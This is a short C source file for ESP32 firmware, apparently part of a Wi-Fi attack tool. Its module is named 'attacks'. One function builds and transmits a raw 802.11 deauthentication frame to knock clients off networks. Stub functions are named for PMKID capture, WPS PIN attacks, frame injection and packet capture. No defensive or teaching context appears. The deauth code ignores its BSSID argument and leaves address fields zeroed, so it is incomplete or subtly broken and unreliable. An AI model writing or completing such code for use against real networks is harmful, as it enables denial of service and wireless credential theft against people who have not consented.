#include "esp_wifi.h"
#include "esp_err.h"
#include "proto.h"
#include "esp_log.h"
static const char *TAG = "attacks";
esp_err_t attack_deauth(const char *bssid) {
    uint8_t frame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xF0,0x00,0x02,0x00};
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}
esp_err_t attack_pmkid(const char *bssid) { (void)bssid; return ESP_OK; }
esp_err_t attack_wps_reg(const char *bssid, const char *pin) { (void)bssid; (void)pin; return ESP_OK; }
esp_err_t attack_inject(const char *hex) { (void)hex; return ESP_OK; }
esp_err_t attack_capture(const char *filter_cfg) { (void)filter_cfg; return ESP_OK; }
